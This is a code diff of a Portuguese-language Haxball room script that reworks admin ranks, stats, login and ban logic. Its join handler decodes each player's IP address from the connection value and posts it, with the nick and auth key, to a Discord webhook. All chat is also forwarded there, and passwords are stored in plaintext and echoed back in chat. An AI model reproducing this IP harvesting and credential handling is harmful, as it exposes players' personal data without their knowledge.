+                            room.setPlayerAdmin(playerAdmin.id, false);
+                            gerentes.splice(adminList.indexOf(authArray[playerAdmin.id], 1))
+                            room.sendAnnouncement(`Este jogador não é mais um gerente permanente!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
+                        }
+                    } else if (admin == 4) {
+                        if (!diretores.map((a) => a[0]).includes(authArray[playerAdmin.id])) {
+                            if (!masterList.includes(authArray[playerAdmin.id])) {
+                                if (!diretores.includes(authArray[playerAdmin.id])) {
+                                    room.setPlayerAdmin(playerAdmin.id, true)
+                                    diretores.push(authArray[playerAdmin.id]);
+                                    room.sendAnnouncement(`${playerAdmin.name} Agora é um Diretor!`, null, announcementColor, 'bold', HaxNotification.CHAT)
+                                } else {
+                                    room.sendAnnouncement(`Este jogador já é um diretor!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
+                                }
+                            } else {
+                                room.setPlayerAdmin(playerAdmin.id, false);
+                                masterList.splice(masterList.indexOf(authArray[playerAdmin.id], 1))
+                                room.sendAnnouncement(`Este jogador não é mais um Fundador!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
+                            }
+                        } else {
+                            room.setPlayerAdmin(playerAdmin.id, false);
+                            diretores.splice(adminList.indexOf(authArray[playerAdmin.id], 1))
+                            room.sendAnnouncement(`Este jogador não é mais um diretor permanente!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
+                        }
                     }
                 } else {
-                    room.setPlayerAdmin(playerAdmin.id, false);
-                    adminList.splice(adminList.indexOf([authArray[playerAdmin.id], playerAdmin.name], 1))
-                    room.sendAnnouncement(
-                        `Este jogador não é mais um administrador permanente!`,
-                        player.id, errorColor, 'bold', HaxNotification.CHAT)
+                    room.sendAnnouncement(`Não tem um jogador com esse ID na sala. Digite "!ajuda setadmin" para obter mais informações.`, player.id, errorColor, 'bold', HaxNotification.CHAT);
                 }
             } else {
-                room.sendAnnouncement(
-                    `Não há jogador com tal ID na sala. Digite "!ajuda setadmin" para obter mais informações.`,
-                    player.id, errorColor, 'bold', HaxNotification.CHAT
-                );
+                room.sendAnnouncement(`Formato incorreto de argumentos. Digite "!ajuda setadmin" para obter mais informações.`, player.id, errorColor, 'bold', HaxNotification.CHAT);
             }
         } else {
-            room.sendAnnouncement(
-                `Formato incorreto para seu argumento. Digite "!ajuda setadmin" para obter mais informações.`,
-                player.id,
-                errorColor,
-                'bold',
-                HaxNotification.CHAT
-            );
+            room.sendAnnouncement(`Número incorreto de argumentos. Digite "!ajuda setadmin" para obter mais informações.`, player.id, errorColor, 'bold', HaxNotification.CHAT);
         }
-    } else {
-        room.sendAnnouncement(
-            `Número incorreto de argumentos. Digite "!ajuda setadmin" para obter mais informações.`,
-            player.id,
-            errorColor,
-            'bold',
-            HaxNotification.CHAT
-        );
+    } catch (err) {
+        error(err, 'Set Admin Command');
     }
 }
 
 function sendLinkDiscord(player, message) {
-    room.sendAnnouncement(`Link do nosso discord:https://discord.gg/ddDFENZR ${discord}`,
+    room.sendAnnouncement(`A temporada já começou, então não fique de fora e acesse o nosso servidor no discord: ${discord}`,
         player.id,
         announcementColor,
         'bold',
@@ -8662,6 +5377,7 @@ function endGame(winner) {
     game.scores = scores;
     lastWinner = winner;
     endGameVariable = true;
+    pagamentoAposta(winner)
     if (winner == Team.RED) {
         streak++;
         room.sendAnnouncement(
@@ -8740,6 +5456,8 @@ function endGame(winner) {
         HaxNotification.NONE
     );
     updateStats();
+
+
 }
 
 /* CHOOSING FUNCTIONS */
@@ -8818,7 +5536,7 @@ function choosePlayer() {
                     (player) => {
                         room.kickPlayer(
                             player.id,
-                            "Tu não escolheu a tempo!",
+                            "Você não escolheu a tempo!",
                             false
                         )
                     },
@@ -8985,7 +5703,7 @@ function slowModeFunction(player, message) {
                     (number) => {
                         SMSet.delete(number);
                     },
-                    1.5 * 1000,
+                    1000,
                     player.id
                 );
             } else {
@@ -8999,7 +5717,7 @@ function slowModeFunction(player, message) {
                 (number) => {
                     SMSet.delete(number);
                 },
-                slowMode * 1000,
+                1000,
                 player.id
             );
         } else {
@@ -9029,8 +5747,11 @@ function updateAdmins(excludedPlayerID = 0) {
 
 function getRole(player) {
     return (
-        !!masterList.find((a) => a == authArray[player.id]) * 3 +
-        !!adminList.find((a) => a[0] == authArray[player.id]) * 2 +
+        !!masterList.find((a) => a == authArray[player.id]) * 6 +
+        !!donoList.find((a) => a == authArray[player.id]) * 5 +
+        !!diretores.find((a) => a == authArray[player.id]) * 4 +
+        !!gerentes.find((a) => a == authArray[player.id]) * 3 +
+        !!adminList.find((a) => a == authArray[player.id]) * 2 +
         !!mods.find((a) => a == authArray[player.id]) * 1
     );
 }
@@ -9129,12 +5850,6 @@ function getStartingLineups() {
     }
     return compositions;
 }
-
-async function credits(player, message) {
-    room.sendAnnouncement(`O OBL desenvolveu esse script !!`, player.id, cores.turquesa, 'bold', 3);
-    room.sendAnnouncement(`- Faça parte do servidor oficial dele: https://discord.gg/NbgpBD3Teq`, player.id, cores.violeta, 'bold', 3);
-    return false;
-};
 
 function handleLineupChangeTeamChange(changedPlayer) {
     if (gameState != State.STOP) {
@@ -9285,7 +6000,7 @@ function balanceTeams() {
                 instantRestart();
                 room.setPlayerTeam(players[0].id, Team.RED);
                 return;
-            } else if (teamSize > 2 && players.length == 5) {
+            } else if (players.length == 14) {
                 instantRestart();
             }
             if (players.length == teamSize * 2 - 1) {
@@ -9328,6 +6043,7 @@ function handlePlayersJoin() {
 }
 
 function handlePlayersLeave() {
+    updateTeams();
     if (gameState != State.STOP) {
         var scores = room.getScores();
         if (players.length >= 2 * teamSize && scores.time >= (5 / 6) * game.scores.timeLimit && teamRed.length != teamBlue.length) {
@@ -9364,7 +6080,7 @@ function handlePlayersLeave() {
                 stadiumCommand(emptyPlayer, `!classic`);
             }, 5);*/
         }
-        if (teamRed.length == 0 || teamBlue.length == 0) {
+        if (teamRed.length == 0 || teamBlue.length == 0 && teamSpec.length != 0) {
             room.setPlayerTeam(teamSpec[0].id, teamRed.length == 0 ? Team.RED : Team.BLUE);
             return;
         }
@@ -9615,8 +6331,10 @@ function registrar(player, password) {
     if (account[player.name]) return room.sendAnnouncement("Você já está registrado.", player.id);
 
     account[player.name] = msgArray[1];
+    contas.splice(0, contas.length)
+    contas.push(account)
+    localStorage.setItem("contas", JSON.stringify(contas))
     room.sendAnnouncement(`Sua senha é: ${msgArray[1]}`, player.id);
-
 }
 
 function login(player, password) {
@@ -9632,8 +6350,22 @@ function login(player, password) {
 
 function mudarSenha(player, password) {
     var msgArray = password.split(/ +/)
+    if (msgArray.length == 1) {
+        room.sendAnnouncement(
+            "Você não digitou uma senha para alterar!",
+            null,
+            errorColor,
+            'bold',
+            HaxNotification.MENTION
+        )
+
+        return;
+    }
     if (confirm.includes(player.id)) {
         account[player.name] = msgArray[1]
+        contas.splice(0, contas.length)
+        contas.push(account)
+        localStorage.setItem('contas', JSON.stringify(account))
         room.sendAnnouncement(`Senha alterada com sucesso! Nova Senha: ${msgArray[1]}`, player.id);
     }
 }
@@ -9822,45 +6554,26 @@ function getGoalString(team) {
 function updatePlayerStats(player, teamStats) {
     var stats = new HaxStatistics(player.name);
     var pComp = getPlayerComp(player);
-    if (localStorage.getItem(authArray[player.id])) {
-        stats = JSON.parse(localStorage.getItem(authArray[player.id]));
+    if (statsplayer[player.name]) {
+        stats = statsplayer[player.name];
     }
-
-    var pointsForWin = 3; // +3 Pontos
-    var pointsForGoal = 1; // +1 Ponto 
-    var pointsForAssist = 1; // +1 Ponto
-    var pointsForCS = 1; // +1 Ponto
-    var pointsForDraw = 1; // +1 Ponto
-    var pointsForLoss = -1; // -1 Ponto
-
     stats.games++;
-
-    if (lastWinner == teamStats) {
-        stats.wins += 1;
-    }
-
-    if (lastWinner == 0) {
-        stats.empates += 1;
-    }
-
+    addAstros(player, 3)
+    if (lastWinner == teamStats) stats.wins++
+    if (lastWinner == 0) stats.empates++
     stats.winrate = ((100 * stats.wins) / (stats.games || 1)).toFixed(1) + `%`;
-
-    var goalsScored = getGoalsPlayer(pComp);
-    stats.goals += goalsScored;
-
+    stats.goals += getGoalsPlayer(pComp);
     stats.assists += getAssistsPlayer(pComp);
     stats.ownGoals += getOwnGoalsPlayer(pComp);
     stats.CS += getCSPlayer(pComp);
-    stats.pontos = Math.round(
-        (pointsForWin * stats.wins) +
-        (pointsForGoal * stats.goals) +
-        (pointsForAssist * stats.assists) +
-        (pointsForCS * stats.CS) +
-        (pointsForDraw * stats.empates) +
-        (pointsForLoss * (stats.games - stats.wins))
-    );
-
-    localStorage.setItem(authArray[player.id], JSON.stringify(stats));
+    stats.pontos = (3 * stats.wins) - (stats.games - stats.wins) + stats.goals + stats.assists + stats.CS + stats.empates
+    if (tipoVip == 3) {
+        stats.pontos += (stats.pontos / 100) * 15
+    } else if (tipoVip == 4) {
+        stats.pontos += (stats.pontos / 100) * 30
+    }
+    statsplayer[player.name] = stats
+    localStorage.setItem('statsplayer', JSON.stringify(statsplayer));
 }
 
 function updateStats() {
@@ -9885,13 +6598,11 @@ function updateStats() {
 function printRankings(statKey, id = 0) {
     var leaderboard = [];
     statKey = statKey == "cs" ? "CS" : statKey;
-    for (var i = 0; i < localStorage.length; i++) {
-        var key = localStorage.key(i);
-        if (key.length == 43)
-            leaderboard.push([
-                JSON.parse(localStorage.getItem(key)).playerName,
-                JSON.parse(localStorage.getItem(key))[statKey],
-            ]);
+    for (var key in statsplayer) {
+        leaderboard.push([
+            statsplayer[key].playerName,
+            statsplayer[key][statKey],
+        ]);
     }
     if (leaderboard.length < 5) {
         if (id != 0) {
@@ -9922,6 +6633,7 @@ function printRankings(statKey, id = 0) {
         HaxNotification.CHAT
     );
 }
+
 
 /* GET STATS FUNCTIONS */
 
@@ -9955,6 +6667,7 @@ function getGoalsPlayer(pComp) {
         if (goal.striker != null && goal.team === pComp.player.team) {
             if (authArray[goal.striker.id] == pComp.auth) {
                 goalPlayer++;
+                addAstros(goal.striker, 5)
             }
         }
     }
@@ -9981,6 +6694,7 @@ function getAssistsPlayer(pComp) {
         if (goal.assist != null) {
             if (authArray[goal.assist.id] == pComp.auth) {
                 assistPlayer++;
+                addAstros(goal.assist, 3)
             }
         }
     }
@@ -10003,8 +6717,10 @@ function getGKPlayer(pComp) {
 function getCSPlayer(pComp) {
     if (pComp == null) return 0;//
     if (getGKPlayer(pComp) == Team.RED && game.scores.blue == 0) {
+        addAstros(pComp.player, 5)
         return 1;
     } else if (getGKPlayer(pComp) == Team.BLUE && game.scores.red == 0) {
+        addAstros(pComp.player, 5)
         return 1;
     }
     return 0;
@@ -10168,111 +6884,12 @@ function fetchActionsSummaryReport(game) {
 
 /* PLAYER MOVEMENT */
 
-function adicionarJogador(nome, id, conn, auth, ipv4) {
-    jogadoresRoom.push({
-        nome: nome,
-        id: id,
-        conn: conn,
-        auth: auth,
-        ipv4: ipv4
-    });
-}
-
-function getIPv4DoJogador(nomeJogador) {
-    for (var i = 0; i < jogadoresRoom.length; i++) {
-        if (jogadoresRoom[i].nome === nomeJogador) {
-            return jogadoresRoom[i].ipv4;
-        }
-    }
-    return null; // Retorna null se o jogador não for encontrado
-}
-
-function getJogadorPeloNome(nomeJogador) {
-    for (var i = 0; i < jogadoresRoom.length; i++) {
-        if (jogadoresRoom[i].nome === nomeJogador) {
-            return jogadoresRoom[i];
-        }
-    }
-    return null;
-}
-
-function getJogadorConnPorNome(nomeJogador) {
-    for (var i = 0; i < jogadoresRoom.length; i++) {
-        if (jogadoresRoom[i].nome === nomeJogador) {
-            return jogadoresRoom[i].conn;
-        }
-    }
-    return null;
-}
-
-function getJogadorAuthPorNome(nomeJogador) {
-    for (var i = 0; i < jogadoresRoom.length; i++) {
-        if (jogadoresRoom[i].nome === nomeJogador) {
-            return jogadoresRoom[i].auth;
-        }
-    }
-    return null;
-}
-
-function removerJogadorPorNome(nomeJogador) {
-    for (var i = 0; i < jogadoresRoom.length; i++) {
-        if (jogadoresRoom[i].nome === nomeJogador) {
-            jogadoresRoom.splice(i, 1);
-            return true;
-        }
-    }
-    return false;
-}
-
 room.onPlayerJoin = async function (player) {
-    var ipv4 = await getIP(player);
-    var ipv4DoJogador = getIPv4DoJogador(player.name);
-
-    userConn = player.conn;
-    userAuth = player.auth;
-    userIp = ipv4;
-
-    var msgEntrada = "```" + "📝 Informações do jogador ⏰" + "\n" +
-
-        "🚀" + `${roomName}` + "🚀" + "\n" +
-        "✨ Nick: " + player.name + "\n" +
-        "💥 ID: " + player.id + "\n" +
-        "🌐 Conn: " + player.conn + "\n" +
-        "💻 Auth: " + player.auth + "\n" +
-        "🌏 Ipv4 " + (ipv4) + "\n" +
-        "⏰ Data: " + `${getCurrentDatetime()}` + "```";
-
-    if (urls.entradas != '') {
-        fetch(urls.entradas, {
-            method: 'POST',
-            body: JSON.stringify({
-                content: `${player.name} Entrou na ${roomName}, informações: \n\n` + msgEntrada,
-                username: roomName,
-            }),
-            headers: {
-                'Content-Type': 'application/json',
-            },
-        }).then((res) => res);
+    if (connbanida.includes(player.conn) || authbanida.includes(player.auth) || nomebanido.includes(player.name)) {
+        room.kickPlayer(player.id, `Você está banido, consulte o nosso Discord: ${discord}`, false)
     }
 
-    var jogador = {
-        nome: player.name,
-        id: player.id,
-        conn: player.conn,
-        auth: player.auth,
-        ipv4: ipv4
-    };
-
-    adicionarJogador(jogador.nome, jogador.id, jogador.conn, jogador.auth, jogador.ipv4);
-
-    localStorage.setItem("jogadoresRoom", JSON.stringify(jogador));
-
-    var ipBanned = ipv4;
-    var connDoJogador = userConn;
-    var authDoJogador = userAuth;
-    var nomeDoJogador2 = player.name;
-
-    var isBanned = banList.some(user => {
+    /* var isBanned = banList.some(user => {
         return (
             user.ipv4 === ipBanned ||
             user.conn === connDoJogador ||
@@ -10283,30 +6900,89 @@ room.onPlayerJoin = async function (player) {
 
     var isIpBanned = ipbanido.some(ip => {
         return ip.ipv4 === ipBanned;
-    });
-
-    var isConnBanned = connbanida.some(conection => {
+    }), isConnBanned = connbanida.some(conection => {
         return conection.conn === connDoJogador;
-    });
-
-    var isAuthBanned = authbanida.some(conection => {
+    }), isAuthBanned = authbanida.some(conection => {
         return conection.auth === authDoJogador;
     });
 
     if (isBanned || isIpBanned || isConnBanned || isAuthBanned) {
         room.kickPlayer(player.id, `Você está banido(a). Consulte o motivo no nosso DC: ${discord}`, false);
         return false;
+    } */
+
+    if (messageBlocks[player.name] == undefined) {
+        messageBlocks[player.name] = { name: player.name, blocking: [] };
+    }
+
+    // Busca astros, se não houver, cria a conta do player.
+    if (!astros[player.name]) {
+        astros[player.name] = 0
+        astrosstorage.splice(0, astrosstorage.length);
+        astrosstorage.push(astros);
+        localStorage.setItem("astros", JSON.stringify(astrosstorage));
+
+    }
+    if (!dadosjogadores[player.name]) {
+        dadosjogadores[player.name] = {
+            'nome': player.name,
+            'conn': player.conn,
+            'auth': player.auth,
+            'id': player.id
+
+        }
+        dadosjogadoresstorage.splice(0, dadosjogadoresstorage.length)
+        dadosjogadoresstorage.push(dadosjogadores)
+        localStorage.setItem("dadosjogadores", JSON.stringify(dadosjogadoresstorage))
+    }
+    else {
+        if (dadosjogadores[player.name]['id'] != player.id) {
+            dadosjogadores[player.name]['id'] = player.id
+            dadosjogadoresstorage.splice(0, dadosjogadoresstorage.length)
+            dadosjogadoresstorage.push(dadosjogadores)
+            localStorage.setItem("dadosjogadores", JSON.stringify(dadosjogadoresstorage))
+        }
+    }
+    //
+    if (isBlacklisted(player) == true) {
+        room.kickPlayer(player.id, "Você está banido!", true);
     }
 
     if (room.getPlayerList().length <= 7) {
-        defaultSlowMode = 1.5
+        defaultSlowMode = 1
     } else if (room.getPlayerList().length < 15) {
-        defaultSlowMode = (0.2 * room.getPlayerList().length).toFixed(1)
+        defaultSlowMode = 1
     } else {
-        defaultSlowMode = 3.0
+        defaultSlowMode = 1
     }
 
     authArray[player.id] = player.auth
+
+    connautologin = player.conn
+    authautologin = player.auth
+
+    playerConnections.set(player.id, player.conn);
+    playerAuth.set(player.id, player.auth);
+    playerIpv4.set(player.id, ipv4);
+
+    var connDoJogador = playerConnections.get(player.id);
+    var authDoJogador = playerAuth.get(player.id);
+    var ipv4DoJogador = playerIpv4.get(player.id);
+
+    var conn = player.conn
+    var ipv4 = conn.match(/.{1,2}/g).map(function (v) {
+        return String.fromCharCode(parseInt(v, 16));
+    }).join('');
+
+    sendAnnouncementToDiscord2(
+        "```" + "📝Informações do jogador, conn, auth, IP e data ⏰" + "\n" +
+
+        "🪬" + `${roomName}` + "🪬" + "\n" +
+        "✨ Nick: " + player.name + "\n" +
+        "🌐 Conn: " + connDoJogador + "\n" +
+        "💻 Auth: " + authDoJogador + "\n" +
+        "🌏 Ipv4 " + ipv4DoJogador + "\n" +
+        "⏰ Data: " + `${getDateInfo()}` + "```");
 
     room.sendAnnouncement(
         `👋 Olá, ${player.name}! Seja Bem-vindo a VorteX .          Digite !ajuda para ver os comandos!\nLink do nosso discord -> ${discord}`,
@@ -10314,31 +6990,59 @@ room.onPlayerJoin = async function (player) {
         welcomeColor,
         'bold',
         HaxNotification.CHAT
-    )
+    );
+
     updateTeams();
     updateAdmins();
+
     if (masterList.findIndex((auth) => auth == player.auth) != -1) {
-        room.sendAnnouncement(`Dono ${player.name} conectou-se à sala!`,
+        room.sendAnnouncement(`O Fundador ${player.name} conectou-se à sala!`, null, announcementColor, 'bold', HaxNotification.CHAT)
+        room.setPlayerAdmin(player.id, true);
+    } else if (donoList.findIndex((auth) => auth == player.auth) != -1) {
+        room.sendAnnouncement(`O Dono ${player.name} conectou-se à sala!`, null, announcementColor, 'bold', HaxNotification.CHAT)
+        room.setPlayerAdmin(player.id, true);
+    } else if (diretores.findIndex((auth) => auth == player.auth) != -1) {
+        room.sendAnnouncement(`O Diretor ${player.name} conectou-se à sala!`, null, announcementColor, 'bold', HaxNotification.CHAT)
+        room.setPlayerAdmin(player.id, true);
+    } else if (gerentes.findIndex((auth) => auth == player.auth) != -1) {
+        room.sendAnnouncement(`O Gerente ${player.name} conectou-se à sala!`,
             null, announcementColor, 'bold', HaxNotification.CHAT)
         room.setPlayerAdmin(player.id, true);
-    } else if (adminList.map((a) => a[0]).findIndex((auth) => auth == player.auth) != -1) {
-        room.sendAnnouncement(`O administrador ${player.name} conectou-se à sala!`,
+    } else if (adminList.findIndex((auth) => auth == player.auth) != -1) {
+        room.sendAnnouncement(`O Administrador ${player.name} conectou-se à sala!`,
             null, announcementColor, 'bold', HaxNotification.CHAT)
         room.setPlayerAdmin(player.id, true);
     } else if (mods.findIndex((auth) => auth == player.auth) != -1) {
         room.sendAnnouncement(`O Moderador ${player.name} conectou-se à sala!`,
             null, announcementColor, 'bold', HaxNotification.CHAT)
         room.setPlayerAdmin(player.id, true);
-    } else if (puskas[player.auth]) {
-        room.sendAnnouncement(`Temos um jogador Puskás entre nós !! \nBem vindo(a) ${player.name}`, null, announcementColor, 'bold', 3);
-    } else if (goldBall[player.auth]) {
-        room.sendAnnouncement(`Temos um jogador Bola de ouro entre nós !! \nBem vindo(a) ${player.name}`, null, announcementColor, 'bold', 3);
     } else if (vips[player.auth]) {
         if (vips[player.auth].msgEntrada != '') {
             room.sendAnnouncement(`${vips[player.auth].msgEntrada}`,
                 null, announcementColor, 'bold', HaxNotification.CHAT)
         }
     }
+
+    if (puskas[player.auth]) {
+        room.sendAnnouncement(`Temos um jogador Puskás entre nós !! \nBem vindo(a) ${player.name}`, null, announcementColor, 'bold', 3);
+    }
+    if (buskas[player.auth]) {
+        room.sendAnnouncement(`Temos um jogador Buskás entre nós !! \nBem vindo(a) ${player.name}`, null, announcementColor, 'bold', 3);
+    }
+    if (goldBall[player.auth]) {
+        room.sendAnnouncement(`Temos um jogador Bola de ouro entre nós !! \nBem vindo(a) ${player.name}`, null, announcementColor, 'bold', 3);
+    }
+
+    if (chuteira[player.auth]) {
+        room.sendAnnouncement(`Temos um jogador Chuteira de ouro entre nós !! \nBem vindo(a) ${player.name}`, null, announcementColor, 'bold', 3);
+    }
+    if (luva[player.auth]) {
+        room.sendAnnouncement(`Temos um jogador Luva de ouro entre nós !! \nBem vindo(a) ${player.name}`, null, announcementColor, 'bold', 3);
+    }
+    if (garcom[player.auth]) {
+        room.sendAnnouncement(`Temos um jogador Garçom entre nós !! \nBem vindo(a) ${player.name}`, null, announcementColor, 'bold', 3);
+    }
+
     var sameAuthCheck = playersAll.filter((p) => p.id != player.id && authArray[p.id] == player.auth);
     if (sameAuthCheck.length > 0 && !debugMode) {
         var oldPlayerArray = playersAll.filter((p) => p.id != player.id && authArray[p.id] == player.auth);
@@ -10348,23 +7052,36 @@ room.onPlayerJoin = async function (player) {
     }
     handlePlayersJoin()
 
-    if (account[player.name]) {
-        room.sendAnnouncement(`Existe uma conta com este nick! Faça login em 30 segundos ou será kikado.\n!login <senha> \nSe essa conta não for sua, mude seu nick e volte.`, player.id);
+    auto = false
+    if (autologin[player.name]) {
+
+        if (autologin[player.name]['auth'] == player.auth && autologin[player.name]['conn'] == player.conn) {
+            auto = true
+            confirm.push(player.id)
+            room.sendAnnouncement(`Você realizou Autologin na VorteX.`, player.id, announcementColor, "bold");
+        }
+        else {
+            room.sendAnnouncement(`Falha no autologin, local de acesso não reconhecido, use sua senha!`, player.id, errorColor, "bold");
+        }
+    }
+
+    if (account[player.name] && auto == false) {
+        room.sendAnnouncement(`Existe uma conta com este nick! Faça login em 30 segundos ou será kikado.\n!login <senha> \nSe essa conta não for sua, mude seu nick e volte.`, player.id, 0x89a46f, "bold");
         let tempoI = 0
         let interval1 = setInterval(() => {
             tempoI++
             if (confirm.includes(player.id)) {
                 clearInterval(interval1)
             } else {
-                room.sendAnnouncement(`Existe uma conta com este nick! Faça login em 30 segundos ou será kikado.\n!login <senha> \nSe essa conta não for sua, mude seu nick e volte.`, player.id);
+                room.sendAnnouncement(`Existe uma conta com este nick! Faça login em 30 segundos ou será kikado.\n!login <senha> \nSe essa conta não for sua, mude seu nick e volte.`, player.id, 0xFFC375, "bold");
             }
             if (tempoI == 6) {
                 room.kickPlayer(player.id, "Faça login na sua conta.", false)
                 clearInterval(interval1)
             }
         }, 5 * 1000)
-    } else {
-        room.sendAnnouncement("Se registre com o comando: !registrar <senha>", player.id)
+    } else if (!account[player.name]) {
+        room.sendAnnouncement("Se registre com o comando: !registrar <senha>", player.id, 0x56877d, "bold")
     }
 }
 
@@ -10392,35 +7109,29 @@ room.onPlayerTeamChange = function (changedPlayer, byPlayer) {
 };
 
 room.onPlayerLeave = function (player) {
-    var conn = userConn
-    var ipv4 = conn.match(/.{1,2}/g).map(function (v) {
-        return String.fromCharCode(parseInt(v, 16));
-    }).join('');
-
-    var infoUser = `Nick: ${player.name} \nID: ${player.id} \nConn: ${conn} \nAuth: ${userAuth} \nIPV4: ${ipv4} \nData e hora: ${getCurrentDatetime()}`;
-
-    if (urls.saidas != "") {
-        fetch(urls.saidas, {
-            method: 'POST',
-            body: JSON.stringify({
-                content: `O ${player.name} saiu da ${roomName}! \n\n\`\`\`${infoUser}\`\`\``,
-                username: roomName,
-            }),
-            headers: {
-                'Content-Type': 'application/json',
-            },
-        }).then((res) => res);
-    }
-
-    setTimeout(() => {
-        removerJogadorPorNome(player.name);
-    }, 10000);
+    // for(let v in posicoesPreenchidasRed){
+    //     if(posicoesPreenchidasRed[v] == player.id){
+    //         posicoesPreenchidasRed[v] = false
+    //     }
+    // }
+    // for(let v in posicoesPreenchidasBlue){
+    //     if(posicoesPreenchidasBlue[v] == player.id){
+    //         posicoesPreenchidasBlue[v] = false
+    //     }
+    // }
+    // if(escolheramPosicao.includes(player.id)){
+    //     let index = escolheramPosicao.indexOf(player.id)
+    //     escolheramPosicao.splice(index, 1)
+    // }
 
     if (confirm.includes(player.id)) {
         confirm.splice(confirm.indexOf(player.id), 1)
     }
     setTimeout(() => {
         delete authArray[player.id]
+        playerConnections.delete(player.id);
+        playerAuth.delete(player.id);
+        playerIpv4.delete(player.id);
     }, 5 * 1000)
     handleLineupChangeLeave(player);
     checkCaptainLeave(player);
@@ -10431,31 +7142,13 @@ room.onPlayerLeave = function (player) {
 
 room.onPlayerKicked = function (kickedPlayer, reason, ban, byPlayer) {
     kickFetchVariable = true;
-
-    if (urls.roomLogChat != '') {
-        var stringContent = `||[${getDate()}]|| ⛔ ${ban ? 'BAN' : 'KICK'}\n` +
-            `**${kickedPlayer.name}** was ${ban ? 'banned' : 'kicked'}` +
-            `${byPlayer != null ? ' by **' + byPlayer.name + '**' : ''}`
-        fetch(urls.roomLogChat, {
-            method: 'POST',
-            body: JSON.stringify({
-                content: stringContent,
-                username: roomName,
-            }),
-            headers: {
-                'Content-Type': 'application/json',
-            },
-        }).then((res) => res);
-    }
-
-
     if ((ban && ((byPlayer != null &&
-        (byPlayer.id == kickedPlayer.id || getRole(byPlayer) < Role.ADMIN_PERM)) || getRole(kickedPlayer) == Role.MASTER)) || disableBans
+        (byPlayer.id == kickedPlayer.id || getRole(byPlayer) < Role.ADMIN)) || getRole(kickedPlayer) == Role.MASTER)) || disableBans
     ) {
         room.clearBan(kickedPlayer.id);
         return;
     }
-    if (byPlayer != null && getRole(byPlayer) < Role.ADMIN_PERM) {
+    if (byPlayer != null && getRole(byPlayer) < Role.ADMIN) {
         room.sendAnnouncement(
             'Você não tem permissão para expulsar/banir jogadores!',
             byPlayer.id,
@@ -10470,44 +7163,169 @@ room.onPlayerKicked = function (kickedPlayer, reason, ban, byPlayer) {
 };
 
 /* PLAYER ACTIVITY */
+function stopChangeVip(vipTimeoutId) {
+    clearTimeout(vipTimeoutId); // Parar a execução agendada pelo setTimeout
+}
 
 room.onPlayerChat = function (player, message) {
-    var keywords = [
-        "claim", "ceo", "fundador", "adm", "admin", "administrador",
-        "mod", "moderador", "mode", "gerente", "dono", "login",
-        "registrar", "register", "mudarsenha", "logar"
-    ];
+    var comando = message[0];
+    enviaChatParaDiscord(`${player.name}: ${message}`);
 
-    function checkForKeywords(message, keywords) {
-        const lowerCaseMessage = message.toLowerCase();
-
-        for (const keyword of keywords) {
-            if (lowerCaseMessage.includes(keyword.toLowerCase())) {
-                return true;
+    // CHAT VIP
+    /* if (vips[player.auth] && vips[player.auth].tipoVip > 0) {
+        if (message.startsWith(chatVipCommand)) {
+            for (var id in vips) {
+                var vipInfo = vips[id];
+    
+                if (vipInfo.auth === player.auth) {
+                    if (player.admin) {
+                        room.sendAnnouncement(` 💎 [CHAT VIP] [ADMIN] ${player.name}: ${message.slice(chatVipCommand.length)}`, vipInfo.id, cores.amareloEscuro, 'bold', 2);
+                    } else {
+                        room.sendAnnouncement(` 💎 [CHAT VIP] ${player.name}: ${message.slice(chatVipCommand.length)}`, vipInfo.id, cores.ciano, 'bold', 2);
+                    }
+                }
             }
+    
+            return false;
         }
+    } */
+
+
+
+
+    // CHAT ADMIN
+    if (player.admin || mods.includes(authArray[player.id]) || adminList.includes(authArray[player.id]) || gerentes.includes(authArray[player.id]) || diretores.includes(authArray[player.id]) || donoList.includes(authArray[player.id]) || masterList.includes(authArray[player.id])) {
+
+        if (message.startsWith(chatAdmCommand)) {
+            var players = room.getPlayerList();
+
+            for (var i = 0; i < players.length; i++) {
+                var adminPlayer = players[i];
+
+                if (adminPlayer.admin) {
+                    room.sendAnnouncement(` 🚧 [CHAT ADMIN] ${player.name}: ${message.slice(chatVipCommand.length)}`, adminPlayer.id, cores.ciano, 'bold', 2);
+                }
+            }
+
+            return false;
+        }
+    }
+
+    if (message.substr(0, prefixTeamChatString.length) == prefixTeamChatString) {
+        room.getPlayerList()
+            .filter(callback => callback.team == player.team)
+            .forEach(callback => {
+                room.sendAnnouncement(`[CHAT TEAM]${player.name}: ${message.substr(prefixTeamChatString.length)}`, callback.id, player.team == 1 ? 0xff7b73 : player.team == 0 ? 0xe4ffb6 : 0x38b5ff);
+            });
         return false;
     }
 
-    if (!checkForKeywords(message, keywords)) {
-        fetch(urls.roomLogChat, {
-            method: 'POST',
-            body: JSON.stringify({
-                content: `||[${getDate()}]|| 💬 CHAT \n**${player.name}** : ${message.replace('@', '@ ')}`,
-                username: roomName,
-            }),
-            headers: {
-                'Content-Type': 'application/json',
-            },
-        }).then((res) => res);
+    var players = room.getPlayerList();
+    var recipients = players.filter(p => messageBlocks[p.name].blocking.includes(player.id) == false);
+    var command = message.toLowerCase().split(" ")[0];
+    var p2;
+
+    if (ignoreCommands.includes(command) == true) {
+        var index = ignoreCommands.indexOf(command);
+        var ID = parseInt(message.toLowerCase().split(" ")[1]);
+        var p = players.find(x => x.id == ID);
+
+        if (p) {
+            if (p.id == player.id) {
+                room.sendAnnouncement(`${ignoreMessageSets[index][0]} (ID: ${ID})`, player.id, colors2[0], fonts[0], sounds[0]);
+                return false;
+            }
+            else {
+                if (messageBlocks[player.name].blocking.includes(p.id) == false) {
+                    if (index == 0) {
+                        messageBlocks[player.name].blocking.push(p.id);
+                        room.sendAnnouncement(`${p.name}${ignoreMessageSets[index][1]} (ID: ${ID})`, player.id, colors2[1], fonts[1], sounds[1]);
+                        return false;
+                    }
+                    else if (index == 1) {
+                        room.sendAnnouncement(`${ignoreMessageSets[index][2]} (ID: ${ID})`, player.id, colors2[2], fonts[2], sounds[2]);
+                        return false;
+                    }
+                    else {
+                        console.log("Error");
+                        return false;
+                    }
+                }
+                else {
+                    if (index == 0) {
+                        room.sendAnnouncement(`${ignoreMessageSets[index][2]} (ID: ${ID})`, player.id, colors2[2], fonts[2], sounds[2]);
+                        return false;
+                    } else if (index == 1) {
+                        var i = messageBlocks[player.name].blocking.indexOf(p.id);
+                        messageBlocks[player.name].blocking.splice(i, 1);
+                        room.sendAnnouncement(`${p.name}${ignoreMessageSets[index][1]} (ID: ${ID})`, player.id, colors2[1], fonts[1], sounds[1]);
